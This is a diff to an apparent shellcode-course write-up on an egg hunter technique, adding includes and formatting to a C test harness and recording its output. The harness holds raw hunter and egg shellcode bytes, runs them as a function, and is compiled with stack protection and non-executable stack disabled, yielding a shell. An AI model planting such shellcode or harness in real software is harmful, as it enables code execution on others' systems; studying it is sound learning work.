@@ -218,7 +218,7 @@ The following C skeleton code will be used to demonstrate the Egg Hunter from a 
 **/
 
 #include <stdio.h>
-#include <sys/types.h>
+#include <string.h>
 
 unsigned char hunter[] = \
 "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee" // objdump -d
@@ -232,12 +232,12 @@ unsigned char egg[] = \
 "\x38\x64\xda\xac\x5e\x24\xca\xa7\xa0\xc8\x0a\x97\xc2\xa1\x64"
 "\xc8\x71\x59\x79\x41\x25\x10\x98\xa0\x49";
 
-main()
+int main()
 {
-printf("Hunter length: %d bytes\n", strlen(hunter));
-printf("Egg length: %d bytes\nHunting the egg...\n", strlen(egg));
-int (*ret)() = (int(*)())hunter;
-ret();
+        printf("Hunter length: %d bytes\n", strlen(hunter));
+        printf("Egg length: %d bytes\nHunting the egg...\n", strlen(egg));
+        int (*ret)() = (int(*)())hunter;
+        ret();
 }
 ```
 
@@ -247,10 +247,14 @@ ret();
 The C code is compiled as an executable ELF binary and executed:
 
 ```bash
-```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egghunter_final
-osboxes@osboxes:~/Downloads/SLAE$ ./egghunter_final
-
+osboxes@osboxes:~/Downloads/SLAE$ ./egghunter_final 
+Hunter length: 35 bytes
+Egg length: 78 bytes
+Hunting the egg...
+$ id
+uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+$ 
 ```
 
 
